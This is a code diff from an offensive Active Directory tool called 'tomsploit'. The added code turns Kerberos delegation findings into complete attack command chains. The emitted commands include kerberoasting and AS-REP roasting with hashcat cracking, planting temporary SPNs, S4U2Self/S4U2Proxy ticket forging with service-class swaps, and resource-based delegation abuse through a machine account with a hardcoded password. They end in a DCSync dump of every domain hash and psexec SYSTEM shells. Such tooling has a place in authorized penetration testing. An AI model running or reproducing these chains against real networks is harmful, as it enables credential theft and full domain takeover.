+            f"# ── GET THE CRED: {acct} holds an SPN — kerberoastable now:\n"
+            f"nxc ldap {ip} -u {you} {cred} \\\n"
+            f"  --kerberoasting {acct.rstrip('$')}.roast "
+            f"--kerberoast-account {acct}\n"
+            f"hashcat -m 13100 {acct.rstrip('$')}.roast "
+            f"/usr/share/wordlists/rockyou.txt\n"
+            f"# then use the cracked secret below.\n#\n")
+    if row.asrep_roastable:
+        return (
+            f"# ── GET THE CRED: {acct} has no preauth — AS-REP roastable now:\n"
+            f"nxc ldap {ip} -u {you} {cred} \\\n"
+            f"  --asreproast {acct.rstrip('$')}.asrep "
+            f"--no-preauth-targets {acct}\n"
+            f"hashcat -m 18200 {acct.rstrip('$')}.asrep "
+            f"/usr/share/wordlists/rockyou.txt\n"
+            f"# then use the cracked secret below.\n#\n")
+    if not row.is_computer:
+        # checked, has neither an SPN nor preauth-disabled: offer to PLANT an
+        # SPN temporarily (nxc does this and cleans up), which needs GenericWrite
+        # over the account — cheap to try, states the requirement.
+        return (
+            f"# ── GET THE CRED: {acct} is not roastable as-is. If you have\n"
+            f"# GenericWrite over it, plant a temp SPN, roast, auto-remove:\n"
+            f"nxc ldap {ip} -u {you} {cred} \\\n"
+            f"  --kerberoasting {acct}.roast --targeted-kerberoast {acct}\n"
+            f"hashcat -m 13100 {acct}.roast /usr/share/wordlists/rockyou.txt\n"
+            f"# otherwise its hash must come from a dump.\n#\n")
+    return ""
+
+
+def _emit_constrained(row: DelegRow, ctx: dict, protocol_transition: bool
+                      ) -> list[tuple[str, str]]:
+    """Constrained delegation splits on protocol transition, and the split is
+    decisive. WITH it, S4U2Self mints a forwardable ticket from the account's
+    own credential and the -impersonate chain works. WITHOUT it, S4U2Self
+    returns a NON-forwardable ticket and that chain fails at the KDC.
+
+    Separately: if the allowed SPN points at the DC, this is not a lateral
+    move but domain compromise, and that case is emitted first."""
+    k = _deleg_known(ctx)
+    dom = k["dom"]
+    ip = k["ip"]
+    account = row.account
+    kind = "machine account" if row.is_computer else "user account"
+    # msDS-AllowedToDelegateTo (from enrichment) is the FULL, authoritative
+    # target list; findDelegation's rights_to shows only the first. Prefer it.
+    spns = _clean_list(row.allowed_to) or _clean_list(row.rights_to)
+    target_spn = spns[0] if spns else "cifs/<target.fqdn>"
+    spn_host = target_spn.split("/", 1)[1] if "/" in target_spn else "<target.fqdn>"
+    principal = dom + "/" + account
+    svc_class = target_spn.split("/")[0]
+
+    others = ""
+    if len(spns) > 1:
+        listed = "\n".join(f"#          {s}" for s in spns)
+        others = f"# ALSO :\n{listed}\n#\n"
+
+    if not protocol_transition:
+        return [(
+            f"CONSTRAINED, no protocol transition on {account} — S4U2Proxy only",
+            _route(
+                get=f"SYSTEM on {spn_host}",
+                required=[f"{account}'s secret",
+                          "a forwardable ticket for the victim user"],
+                missing=_missing_or_nothing([_missing_secret(row, ctx),
+                         "victim ticket — mint via self-RBCD (cmd below)"],
+                         row, ctx),
+                why="without protocol transition S4U2Self is non-forwardable, "
+                    "so you must supply the forwardable ticket yourself")
+            + others
+            + _deleg_getcred_block(row, ctx)
+            + f"# Without protocol transition you cannot mint the victim's\n"
+              f"# forwardable ticket from {account}'s creds alone. Get one via a\n"
+              f"# self-RBCD on {account} (needs GenericWrite/GenericAll over it,\n"
+              f"# which BloodHound will show), then feed it to S4U2Proxy:\n"
+              f"#\n"
+              f"# 1. point {account}'s own RBCD at a computer you control, so you\n"
+              f"#    can S4U2Self AS a controlled machine and get a forwardable\n"
+              f"#    ST for the victim to {account}:\n"
+              f"impacket-rbcd -delegate-to {q(account)} -delegate-from 'TOMPC$' \\\n"
+              f"  -action write {_impacket_self(ctx)} -dc-ip {q(ip)}\n"
+              f"impacket-getST -spn {q('host/' + account)} -impersonate administrator \\\n"
+              f"  {_getst_auth(dom, 'TOMPC$', known_pw='TomsploitAdd1!')} -dc-ip {q(ip)} \\\n"
+              f"  -additional-ticket administrator.ccache\n"
+              f"# 2. now relay THAT ticket through {account}'s constrained path:\n"
+              f"impacket-getST -spn {q(target_spn)} -impersonate administrator \\\n"
+              f"  -additional-ticket administrator.ccache \\\n"
+              f"  {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
+              f"export KRB5CCNAME={q('administrator@' + target_spn.replace('/','_') + '@' + dom.upper() + '.ccache')}\n"
+              f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + spn_host)}",
+        )]
+
+    ccache = f"administrator@{target_spn.replace('/', '_')}@{dom.upper()}.ccache"
+
+    # If ANY allowed target is on the DC, this is the domain-compromise variant
+    # — pick that SPN so the ldap/ swap targets the DC.
+    dc_spn = next((s for s in spns
+                   if "/" in s and _spn_host_is_dc(s.split("/", 1)[1], ctx)), "")
+    if dc_spn:
+        target_spn = dc_spn
+        spn_host = dc_spn.split("/", 1)[1]
+    if dc_spn or _spn_host_is_dc(spn_host, ctx):
+        ldap_spn = f"ldap/{spn_host}"
+        ldap_cc = f"administrator@{ldap_spn.replace('/', '_')}@{dom.upper()}.ccache"
+        cifs_cc = f"administrator@cifs_{spn_host}@{dom.upper()}.ccache"
+        return [(
+            f"CONSTRAINED + PROTOCOL TRANSITION on {account} → {spn_host} (the DC)",
+            _route(
+                get="DCSync — every hash in the domain (incl. krbtgt)",
+                required=f"{account}'s secret — nothing else",
+                missing=_missing_or_nothing([_missing_secret(row, ctx)], row, ctx),
+                why=f"the allowed SPN is on the DC, so swapping the service "
+                    f"class {svc_class}/ → ldap/ on the same host yields a "
+                    f"DCSync ticket")
+            + others
+            + _deleg_getcred_block(row, ctx)
+            + f"# dump every credential in the domain:\n"
+              f"impacket-getST -spn {q(target_spn)} -altservice {q(ldap_spn)} \\\n"
+              f"  -impersonate administrator {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
+              f"export KRB5CCNAME={q(ldap_cc)}\n"
+              f"impacket-secretsdump -k -no-pass -just-dc "
+              f"{q(dom + '/administrator@' + spn_host)}\n"
+              f"#\n"
+              f"# or a shell instead:\n"
+              f"impacket-getST -spn {q(target_spn)} "
+              f"-altservice {q('cifs/' + spn_host)} \\\n"
+              f"  -impersonate administrator {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
+              f"export KRB5CCNAME={q(cifs_cc)}\n"
+              f"impacket-psexec -k -no-pass "
+              f"{q(dom + '/administrator@' + spn_host)}",
+        )]
+
+    return [(
+        f"CONSTRAINED + PROTOCOL TRANSITION on {account} → {spn_host}",
+        _route(
+            get=f"SYSTEM on {spn_host}",
+            required=f"{account}'s secret — nothing else",
+            missing=_missing_or_nothing([_missing_secret(row, ctx)], row, ctx),
+            why=f"S4U2Self is unrestricted here; the ticket works only against "
+                f"{spn_host} (its class is swappable, its host is not)")
+        + others
+        + _deleg_getcred_block(row, ctx)
+        + f"impacket-getST -spn {q(target_spn)} -impersonate administrator \\\n"
+          f"  {_getst_auth(dom, account, row, ctx=ctx)} -dc-ip {q(ip)}\n"
+          f"export KRB5CCNAME={q(ccache)}\n"
+          f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + spn_host)}",
+    )]
+
+
+def _emit_rbcd(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
+    """RBCD row inversion: AccountName is the principal ALREADY allowed to
+    act, DelegationRightsTo is the victim. Enumeration finding this means the
+    edge EXISTS, so lead with abusing it before the familiar write path."""
+    k = _deleg_known(ctx)
+    dom, ip = k["dom"], k["ip"]
+    actor = row.account
+    victims = row.rights_to or ["<VICTIM$>"]
+    victim = victims[0]
+    vhost = f"{victim.rstrip('$').lower()}.{dom}"
+    spn = f"cifs/{vhost}"
+    cc = f"administrator@{spn.replace('/', '_')}@{dom.upper()}.ccache"
+    tompc = dom + "/TOMPC$"
+    # The machine account you create has a password YOU choose, so there is no
+    # unknown hash here — use the chosen password directly. Concrete, so the
+    # block runs as written.
+    tompc_pw = "TomsploitAdd1!"
+    _ms = _missing_secret(row, ctx)
+    # MAQ resolves whether path B (add a computer) is even possible.
+    maq = ctx.get("maq")
+    if maq is None:
+        maq_note = "MAQ > 0"
+    elif maq == 0:
+        maq_note = "MAQ is 0 — cannot add a computer, path B DEAD (use an existing one you control)"
+    else:
+        maq_note = f"MAQ is {maq} — you can add a computer"
+    # Direct-ACE writers on the victim, if daclread found any.
+    _dw_raw = getattr(row, "direct_writers", None)
+    dw = _clean_list(_dw_raw)
+    if dw:
+        write_state = f"direct write held by: {', '.join(dw)}"
+    elif _dw_raw == []:
+        write_state = ("no DIRECT write ACE found (daclread cannot see "
+                       "group-inherited rights — check BloodHound)")
+    else:
+        write_state = f"write on {victim}'s msDS-AllowedToActOnBehalfOfOtherIdentity (AddAllowedToAct)"
+    missing = ["A: " + (_ms if _ms else f"{actor}'s secret — held (you are {actor})"),
+               f"B: {write_state}; {maq_note}"]
+    return [(
+        f"RBCD edge exists: {actor} → {', '.join(victims)}",
+        _route(
+            get=f"SYSTEM on {vhost}",
+            required=[f"(A) {actor}'s secret", f"(B) write on {victim} + add a computer"],
+            missing=missing,
+            why="the RBCD edge already exists — you are abusing it, not "
+                "creating it; either path A or B suffices")
+        + _deleg_getcred_block(row, ctx)
+        + f"# (A) you control {actor}:\n"
+          f"impacket-getST -spn {q(spn)} -impersonate administrator \\\n"
+          f"  {_getst_auth(dom, actor, row, ctx=ctx)} -dc-ip {q(ip)}\n"
+          f"export KRB5CCNAME={q(cc)}\n"
+          f"impacket-psexec -k -no-pass {q(dom + '/administrator@' + vhost)}\n"
+          f"#\n"
+          f"# (B) you have the write instead (TOMPC$ password is yours to set,\n"
+          f"#     so no unknown hash — the same password is used throughout):\n"
+          f"impacket-addcomputer {_impacket_self(ctx)} \\\n"
+          f"  -computer-name 'TOMPC$' -computer-pass {q(tompc_pw)} -dc-ip {q(ip)}\n"
+          f"impacket-rbcd -delegate-to {q(victim)} -delegate-from 'TOMPC$' \\\n"
+          f"  -action write {_impacket_self(ctx)} -dc-ip {q(ip)}\n"
+          f"impacket-getST -spn {q(spn)} -impersonate administrator \\\n"
+          f"  {_getst_auth(dom, 'TOMPC$', known_pw=tompc_pw)} -dc-ip {q(ip)}",
+    )]
+
+
+def summarise_delegation(rows: list[DelegRow], ctx: dict
+                         ) -> list[tuple[str, str, str]]:
+    """One compact factual line per finding: (account, what_it_gets, gap).
+
+    No ranking — every finding is stated the same way and the operator picks.
+    what_it_gets names the outcome (a route to the DC says so, because that is
+    what it yields, not because the tool is recommending it). gap is the SHORT
+    form of MISSING: the one thing still needed, or "" when nothing is."""
+    out: list[tuple[str, str, str]] = []
+    for row in rows:
+        who = "computer" if row.is_computer else "user"
+        spn = row.rights_to[0] if row.rights_to else ""
+        host = spn.split("/", 1)[1] if "/" in spn else spn
+
+        # GAP: shortest statement of what is still missing.
+        if row.roast_checked:
+            if row.kerberoastable:
+                gap = "secret: kerberoastable now"
+            elif row.asrep_roastable:
+                gap = "secret: AS-REP roastable now"
+            elif not row.is_computer:
+                gap = "secret: not roastable — plant SPN or dump"
+            else:
+                gap = "machine hash: dump or SYSTEM on it"
+        else:
+            gap = "its secret"
+
+        if row.kind == DelegKind.RBCD:
+            tgt = ", ".join(row.rights_to) or "<victim>"
+            gets = f"SYSTEM on {tgt}"
+            gap = f"{gap}, or WRITE on {tgt}"
+        elif row.kind == DelegKind.UNCONSTRAINED:
+            gets = "DCSync (capture DC TGT)"
+            if row.is_computer:
+                gap = f"SYSTEM on {row.account.rstrip('$')} or its hash"
+            elif row.roast_checked and not row.own_spn:
+                gap = f"{gap}, and it has NO SPN (add one or not viable)"
+        elif row.kind == DelegKind.CONSTRAINED_PT and _spn_host_is_dc(host, ctx):
+            gets = f"DCSync (delegates to the DC, {host})"
+        elif row.kind == DelegKind.CONSTRAINED_PT:
+            gets = f"SYSTEM on {host or '<target>'}"
+        elif row.kind == DelegKind.CONSTRAINED:
+            gets = f"SYSTEM on {host or '<target>'} (no PT — needs victim ticket)"
+        else:
+            gets = f"{row.kind.value} → {host or '<target>'}"
+
+        out.append((row.account, gets, gap))
+    return out
+
+
+def delegation_file_text(rows: list[DelegRow], ctx: dict, target: str,
+                         domain: str) -> str:
+    """Full delegation command set, as a standalone readable file."""
+    # The credential the scan ran with, for reproducing / re-running the file.
+    user = (ctx.get("deleg_user") or "").strip() or "<unknown>"
+    secret = (ctx.get("cred_secret") or "").strip()
+    if secret:
+        cred = f"-H {secret}" if ctx.get("cred_is_hash") else f"-p '{secret}'"
+    else:
+        cred = "(none / offline)"
+    lines = [
+        "# tomsploit — delegation findings",
+        f"# target : {target}      domain : {domain}",
+        f"# creds  : {user}  {cred}",
+        "",
+    ]
+    routes = suggest_for_delegation(rows, ctx)
+    for i, (label, cmd) in enumerate(routes, 1):
+        lines.append("")
+        lines.extend(_route_box(f"[{i}/{len(routes)}]  {label}"))
+        lines.append("")
+        lines.append(_prettify_route(cmd))
+
+    # Domain-wide context: every kerberoastable account the sweep found. These
+    # are separate from delegation but are the same "get a cred" currency, so
+    # they belong beside the routes. Not commands — a reference list.
+    sweep = ctx.get("roastable_sweep") or []
+    if sweep:
+        lines.append("")
+        lines.extend(_route_box(f"kerberoastable accounts in the domain "
+                                f"({len(sweep)}) — roast any for a foothold"))
+        lines.append("")
+        for name in _clean_list(sweep):
+            lines.append(f"#   {name}")
+        lines.append("# roast all:  nxc ldap <dc> -u <you> <cred> "
+                     "--kerberoasting all.roast")
+        lines.append("# crack:      hashcat -m 13100 all.roast rockyou.txt")
+    return "\n".join(lines).rstrip() + "\n"
+
+
+# Box-drawing width for route headers. These are COMMENT lines (each starts
+# with #), so a stray paste still executes nothing.
+_BOX_W = 74
+
+# A command still holding a <placeholder> is not yet runnable (and '<x>' is a
+# shell redirect). Detect ANY <...> that is not already inside a comment.
+import re as _re_pretty
+_ANGLE_PLACEHOLDER = _re_pretty.compile(r"<[^<>\s][^<>]*>")
+
+
+def _route_box(title: str) -> list[str]:
+    """A framed, comment-safe header for one route."""
+    inner = _BOX_W - 4
+    # wrap the title across lines if long
+    words, cur, wrapped = title.split(), "", []
+    for w in words:
+        if cur and len(cur) + 1 + len(w) > inner:
+            wrapped.append(cur); cur = w
+        else:
+            cur = f"{cur} {w}".strip()
+    if cur:
+        wrapped.append(cur)
+    top = "# ╭" + "─" * (_BOX_W - 3) + "╮"
+    bot = "# ╰" + "─" * (_BOX_W - 3) + "╯"
+    body = [f"# │ {ln.ljust(inner)} │" for ln in wrapped]
+    return [top, *body, bot]
+
+
+def _prettify_route(cmd: str) -> str:
+    """Reformat an emitted route block for readability while staying entirely
+    paste-safe:
+
+      - the GET/REQUIRED/MISSING/WHY header stays as comment lines (read them)
+      - runnable command lines are INDENTED four spaces, so the eye separates
+        'stuff to run' from 'stuff to read' at a glance
+      - the empty '#' spacer lines become real blank lines
+      - a standalone '# 1.'/'# 2.' step label is kept but the command under it
+        is indented beneath it, so steps read as a list
+
+    A command's backslash-continuation lines are indented to match, and a
+    comment that documents a specific command (a line beginning '#   ', i.e.
+    an indented alt-command) is left as-is under it."""
+    src_lines = cmd.split("\n")
+    out: list[str] = []
+    i = 0
+    while i < len(src_lines):
+        line = src_lines[i].rstrip()
+        stripped = line.strip()
+        if stripped == "#" or not stripped:
+            if out and out[-1] != "":
+                out.append("")               # collapse spacer to one blank
+            i += 1
+            continue
+        if stripped.startswith("#"):
+            out.append(line)                 # a comment: leave at margin
+            i += 1
+            continue
+        # a command: gather it plus any \-continuation lines as one unit
+        group = [line]
+        while group[-1].endswith("\\") and i + 1 < len(src_lines):
+            i += 1
+            group.append(src_lines[i].rstrip())
+        has_placeholder = any(_ANGLE_PLACEHOLDER.search(g) for g in group)
+        prefix = "  # " if has_placeholder else "    "
+        out.extend(prefix + g for g in group)
+        i += 1
+    while out and out[0] == "":
+        out.pop(0)
+    while out and out[-1] == "":
+        out.pop()
+    return "\n".join(out)
+
+
+def suggest_for_delegation(rows: list[DelegRow], ctx: dict
+                           ) -> list[tuple[str, str]]:
+    """Parsed rows → only the branches that actually apply. Never raises; a
+    malformed row is skipped exactly as build_suggestions skips a bad
+    template."""
+    out: list[tuple[str, str]] = []
+    for row in rows:
+        try:
+            emitted = None
+            if row.kind == DelegKind.UNCONSTRAINED:
+                emitted = _emit_unconstrained(row, ctx)
+            elif row.kind == DelegKind.CONSTRAINED_PT:
+                emitted = _emit_constrained(row, ctx, protocol_transition=True)
+            elif row.kind == DelegKind.CONSTRAINED:
+                emitted = _emit_constrained(row, ctx, protocol_transition=False)
+            elif row.kind == DelegKind.RBCD:
+                emitted = _emit_rbcd(row, ctx)
+            if emitted and row.roast_checked and row.disabled:
+                # ACCOUNTDISABLE is set — the route cannot run. Keep it visible
+                # (the finding is still real) but mark it dead up front.
+                emitted = [(f"[DISABLED — account inactive] {lbl}",
+                            "# NOTE: this account is DISABLED (userAccountControl\n"
+                            "# has ACCOUNTDISABLE). The route below will not work\n"
+                            "# until/unless the account is re-enabled.\n#\n" + cmd)
+                           for lbl, cmd in emitted]
+            if emitted:
+                out += emitted
+        except Exception:
+            continue
+    return out
+
+
+def build_deleg_ctx(args: argparse.Namespace) -> dict:
+    """Context for --deleg-in. Reads -d/-t/-u/-p/-H straight off argparse
+    rather than a Config, so the offline mode doesn't inherit the scan's
+    requirement for a full credential set — pass what you have, the rest
+    stays as an <ANGLE> placeholder."""
+    dom = (getattr(args, "domain", "") or "").strip() or "<DOMAIN>"
+    target = (getattr(args, "target", "") or "").strip()
+    # -t may be a file of targets in scan mode; here we only want a DC IP, so
+    # take it verbatim unless it's obviously a path.
+    ip = target if target and not os.path.exists(target) else "<DC-IP>"
+    user = (getattr(args, "user", "") or "").strip() or "<you>"
+    is_hash = bool(getattr(args, "hash", None))
+    if is_hash:
+        cred_flag = f"-hashes :{args.hash}"
+        cred_secret = args.hash
+    elif getattr(args, "password", None):
+        cred_flag = f"-p {q(args.password)}"
+        cred_secret = args.password
+    else:
+        cred_flag = "-p '<PASSWORD>'"
+        cred_secret = ""
+    dc_short = (getattr(args, "dc_name", "") or "").strip()
+    return {
+        "dom_plain": dom,
+        "ip": ip,
+        "deleg_user": user,
+        "cred_flag": cred_flag,        # the account YOU authenticate as
+        "cred_secret": cred_secret,
+        "cred_is_hash": is_hash,
+        # Offline mode cannot know the DC's name unless told, so --dc-name
+        # enables the "delegation points at the DC" detection here too.
+        "dc_short": dc_short,
+        "dc_fqdn": f"{dc_short}.{dom}" if dc_short and dom != "<DOMAIN>" else "",
+    }
+
+
+def run_deleg_mode(args: argparse.Namespace) -> int:
+    """--deleg-in: offline transform. Reads findDelegation output, prints only
+    the matching branch(es), exits. Spawns nothing."""
+    src = args.deleg_in
+    try:
+        raw = sys.stdin.read() if src == "-" else open(src, encoding="utf-8",
+                                                       errors="replace").read()
+    except OSError as exc:
+        print(f"{RED}{BOLD}Error:{RESET} cannot read '{src}': {exc}",
+              file=sys.stderr)
+        return 1
+
+    rows = parse_delegation_output(raw)
+    if not rows:
+        print(f"{YELLOW}No delegation rows parsed.{RESET} Expected the table "
+              f"printed by:\n"
+              f"  nxc ldap <dc> -u U -p P --find-delegation\n"
+              f"  impacket-findDelegation DOM/U:P -dc-ip <dc>",
+              file=sys.stderr)
+        return 1
+
+    ctx = build_deleg_ctx(args)
+    blocks = suggest_for_delegation(rows, ctx)
+
+    if args.sh:
+        # Route through the SAME placeholder-commenting logic the scan's --sh
+        # output uses. Without it an unfilled <NTHASH> is a shell REDIRECT:
+        # `bash -n` rejects the script outright, and a sourced one would
+        # silently create junk files. Reporter._sh_command comments whole
+        # logical commands, following backslash continuations.
+        for label, cmd in blocks:
+            print(f"# {label}")
+            for ln in Reporter._sh_command(cmd):
+                print(ln)
+            print()
+        return 0
+
+    counts: dict[str, int] = {}
+    for r in rows:
+        counts[r.kind.value] = counts.get(r.kind.value, 0) + 1
+    tally = ", ".join(f"{v}× {k}" for k, v in sorted(counts.items()))
+    print(f"\n  {CYAN}{BOLD}💡 Delegation — matched branch(es){RESET}  "
+          f"{DIM}({tally}){RESET}")
+    print(f"  {'─' * (BANNER_WIDTH - 2)}")
+    for label, cmd in blocks:
+        print(f"\n    {GREEN}►{RESET} {BOLD}{label}{RESET}")
+        for ln in cmd.split("\n"):
+            print(f"        {ln.rstrip()}")
+    print()
+    return 0
 
 # ─── Anonymous-access command references ────────────────────────────────
 
@@ -1522,7 +3148,8 @@ class Reporter:
             seen.add(key)
             entries = build_suggestions(
                 s, ip, result.hostname, result.is_dc,
-                "" if s.local_auth else (result.domain or self.cfg.domain or ""))
+                "" if s.local_auth else (result.domain or self.cfg.domain or ""),
+                enrich=result, deleg_inline=True, notes=True)
             if not entries:
                 continue
             who = f"{s.domain}\\{s.user}" if s.domain else s.user
@@ -1531,8 +3158,10 @@ class Reporter:
                     else f" {s.auth_type.value}")
             adm = " ADMIN" if s.is_admin else ""
             print(f"\n# --- {s.protocol.upper()}{auth}{scope} · {who}{adm} ---")
-            for label, cmd in entries:
+            for label, cmd, hint in entries:
                 print(f"# {label}")
+                if hint:
+                    print(f"#   → {hint}")
                 for ln in self._sh_command(cmd):
                     print(ln)
             wrote = True
@@ -1575,6 +3204,7 @@ class Reporter:
         if result.guests:
             self._guests(result)
         if result.successes:
+            self._delegation(result)
             self._suggestions(result)
         print(f"{'═' * BANNER_WIDTH}\n")
 
@@ -1863,6 +3493,64 @@ class Reporter:
                   f"usual win — grep it for creds, then reuse them (spray everywhere){RESET}")
             print()
 
+    def _delegation(self, result: TargetResult) -> None:
+        """Compact delegation findings + the full command set written to its
+        own file. Findings belong on screen; command lists belong in a file
+        you open when you are ready to act on one."""
+        rows = getattr(result, "deleg_rows", [])
+        if not rows or self.cfg.deleg_inline:
+            return
+        cred = None
+        for s in sorted(result.successes, key=success_sort_key):
+            if s.protocol == "ldap" and not s.local_auth and not s.is_guest:
+                cred = s
+                break
+        if cred is None:
+            return
+
+        ip = result.real_ip or result.target
+        dom = result.domain or self.cfg.domain or ""
+        try:
+            ctx = build_context(cred, ip, result.hostname, result.is_dc, dom)
+            dctx = _deleg_ctx_from(ctx, cred, ip, result.hostname, getattr(result, "maq", None))
+            dctx["roastable_sweep"] = getattr(result, "roastable_sweep", []) or []
+        except Exception:
+            return
+
+        # The FINDINGS are a domain property (same for anyone), but the
+        # COMMANDS are written for whoever ran the scan — they carry this
+        # account and its credential. So the file is per-(DC, account): key
+        # the name on both, or a second account against the same DC would
+        # silently overwrite the first account's walkthrough.
+        if self.cfg.deleg_out:
+            path = self.cfg.deleg_out          # explicit path: honour it verbatim
+        else:
+            who = _safe_filename_part(cred.user) or "user"
+            path = f"tomsploit-delegation-{ip}-{who}.txt"
+        written = False
+        try:
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(delegation_file_text(rows, dctx, ip, dom or "<unknown>"))
+            written = True
+        except OSError as exc:
+            self._deleg_write_error = str(exc)
+
+        lines = summarise_delegation(rows, dctx)
+        print(f"  {CYAN}{BOLD}🔑 Delegation — {len(rows)} finding(s){RESET}")
+        print(f"  {'─' * (BANNER_WIDTH - 2)}")
+        width = max((len(a) for a, _, _ in lines), default=0)
+        # Uniform, factual: account · what it gets you · what is still missing.
+        # No ranking, no highlight — every finding reads the same.
+        for account, gets, gap in lines:
+            miss = f"   {DIM}need: {gap}{RESET}" if gap else ""
+            print(f"      {BOLD}{account:<{width}}{RESET}  {gets}{miss}")
+        if written:
+            print(f"\n    {DIM}full commands → {RESET}{BOLD}{path}{RESET}")
+        else:
+            print(f"\n    {YELLOW}could not write {path}: "
+                  f"{getattr(self, '_deleg_write_error', 'error')}{RESET}")
+        print()
+
     def _suggestions(self, result: TargetResult) -> None:
         # One block per DISTINCT credential (protocol + auth + scope + user),
         # so two different accounts that both authenticate on the same
@@ -1881,10 +3569,12 @@ class Reporter:
                     s, result.real_ip or result.target, result.hostname,
                     result.is_dc,
                     "" if s.local_auth else (result.domain
-                                             or self.cfg.domain or ""))
+                                             or self.cfg.domain or ""),
+                    enrich=result, deleg_inline=self.cfg.deleg_inline,
+                    notes=self.cfg.notes)
             except Exception as exc:
                 entries = [("error", f"# suggestion builder failed: "
-                            f"{exc.__class__.__name__}: {exc}")]
+                            f"{exc.__class__.__name__}: {exc}", "")]
             if entries:
                 blocks.append((s, entries))
 
@@ -1906,7 +3596,25 @@ class Reporter:
                 header += " · local"
             header += "]"
             print(f"\n    {GREEN}►{RESET} {BOLD}{header}{RESET}")
-            for i, (label, cmd) in enumerate(entries):
+            if self.cfg.bare:
+                # Commands only. Nothing but what you paste.
+                for _l, cmd, _h in entries:
+                    for ln in cmd.split("\n"):
+                        print(f"        {ln.rstrip()}")
+                continue
+            if not self.cfg.notes:
+                # Default: one outcome line per command, then the command.
+                # The hint says what a HIT looks like and where it leads —
+                # never what the command is, which the invocation already
+                # states. Commands with no hint print bare rather than get
+                # a padded line for consistency's sake.
+                for _l, cmd, hint in entries:
+                    if hint:
+                        print(f"        {DIM}# {hint}{RESET}")
+                    for ln in cmd.split("\n"):
+                        print(f"        {ln.rstrip()}")
+                continue
+            for i, (label, cmd, _h) in enumerate(entries):
                 if i > 0:
                     print()
                 if i == 0:
@@ -3332,8 +5040,246 @@ class TomSploit:
                     result.real_ip = ip; break
         result.real_ip = result.real_ip or target
 
+        # Enrichment runs LAST: it needs is_dc and the successes list, and it
+        # sits outside the progress bar because _total was fixed up front.
+        try:
+            self._enrich_dc(result)
+        except InterruptedError:
+            pass
+        except Exception as exc:
+            if self.cfg.debug:
+                import traceback; traceback.print_exc()
+            result.enrich_notes = [f"enrichment failed: {exc}"]
+
         result.elapsed = time.time() - start
         self._clear_progress()
+
+    # ── post-scan LDAP enrichment (DC only) ─
+    #
+    # Turns always-on suggestion blocks into ones gated on what the domain
+    # actually has. Four read-only LDAP queries against a DC we already hold a
+    # working credential for, run in parallel, outside the progress accounting
+    # (the bar's total was fixed before the scan started and must not drift).
+    #
+    # Cost is 4 nxc spawns per DC, ~2-3s wall clock parallelised. Skipped
+    # entirely with --no-enrich, and never attempted without an LDAP success.
+    #
+    # Everything here is ENUMERATION: --find-delegation, -M laps, --gmsa and
+    # -M adcs all read the directory. Nothing is modified, nothing is
+    # exploited — same posture as the rest of tomsploit.
+
+    _ENRICH_TIMEOUT = 45.0
+
+    def _enrich_cred(self, result: TargetResult) -> "Success | None":
+        """Pick the credential to enrich with: a domain-scope LDAP success,
+        preferring an admin one. Local-auth creds are useless against LDAP."""
+        cands = [s for s in result.successes
+                 if s.protocol == "ldap" and not s.local_auth and not s.is_guest]
+        if not cands:
+            return None
+        cands.sort(key=lambda s: (not s.is_admin,))
+        return cands[0]
+
+    def _enrich_nxc(self, target: str, cred: "Success",
+                    extra: list[str]) -> str:
+        """One read-only nxc ldap invocation for enrichment. Returns stdout
+        ('' on failure/timeout) — callers treat empty as 'found nothing'."""
+        cmd = ["nxc", "ldap", target, "-u", cred.user]
+        if cred.is_kerberos:
+            cmd.append("--use-kcache")
+        elif cred.is_hash:
+            cmd.extend(["-H", cred.secret])
+        else:
+            cmd.extend(["-p", cred.secret])
+        if self.cfg.domain:
+            cmd.extend(["-d", self.cfg.domain])
+        cmd.extend(extra)
+        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
+        try:
+            out, err, timed_out = self._run_proc(cmd, self._ENRICH_TIMEOUT)
+        except InterruptedError:
+            return ""
+        return "" if timed_out else (out or "")
+
+    @staticmethod
+    def _enrich_highlights(out: str, drop_prefixes: tuple[str, ...] = ()
+                           ) -> list[str]:
+        """nxc 'highlight' lines carry the actual findings and have NO marker
+        ([+]/[*]/[-]), so they can't be picked out with parse_nxc_line. Take
+        lines with the LDAP banner but no marker, strip the banner, and drop
+        nxc's own failure text ('No result found...', 'No ADCS infrastructure
+        found.') which is printed via logger.fail -> a [-] marker anyway."""
+        hits: list[str] = []
+        for raw in out.split("\n"):
+            line = _ANSI_RE.sub("", raw).rstrip()
+            if not line.strip():
+                continue
+            marker, _msg = parse_nxc_line(line)
+            if marker is not None:
+                continue                      # [+]/[*]/[-]/[!] = status, not a finding
+            body = _DELEG_PREFIX_RE.sub("", line).strip()
+            if not body:
+                continue
+            low = body.lower()
+            if low.startswith(("no result found", "no entries found",
+                               "no adcs infrastructure")):
+                continue
+            if drop_prefixes and body.startswith(drop_prefixes):
+                continue
+            hits.append(body)
+        return hits
+
+    def _enrich_dc(self, result: TargetResult) -> None:
+        """Run the four enrichment queries and record what came back."""
+        if self.cfg.no_enrich or not result.is_dc or self._stop.is_set():
+            return
+        cred = self._enrich_cred(result)
+        if cred is None:
+            return
+        target = result.nxc_target or result.target
+
+        jobs = {
+            "deleg": ["--find-delegation"],
+            "laps":  ["-M", "laps"],
+            "gmsa":  ["--gmsa"],
+            "adcs":  ["-M", "adcs"],
+            # ms-DS-MachineAccountQuota: decides whether RBCD "add a computer"
+            # and the self-RBCD path are even available (0 = dead).
+            "maq":   ["-M", "maq"],
+            # domain-wide kerberoastable sweep: every SPN account you could
+            # roast right now, independent of delegation. --kerberoasting with
+            # no -account filter targets the whole domain; we only PARSE the
+            # account list here (the file is written but not used).
+            "roast": ["--kerberoasting", "/tmp/.tomsploit_sweep.roast"],
+        }
+        outs: dict[str, str] = {}
+        with ThreadPoolExecutor(max_workers=4) as pool:
+            futs = {k: pool.submit(self._enrich_nxc, target, cred, v)
+                    for k, v in jobs.items()}
+            for k, f in futs.items():
+                try:
+                    outs[k] = f.result()
+                except Exception:
+                    outs[k] = ""
+
+        result.deleg_rows = parse_delegation_output(outs.get("deleg", ""))
+        # Resolve the HOW: for exactly the delegation accounts, is each one
+        # kerberoastable / AS-REP-roastable right now? One targeted query, so
+        # the delegation file can state a fact and emit the command instead of
+        # printing "kerberoast it if it holds an SPN".
+        if result.deleg_rows:
+            try:
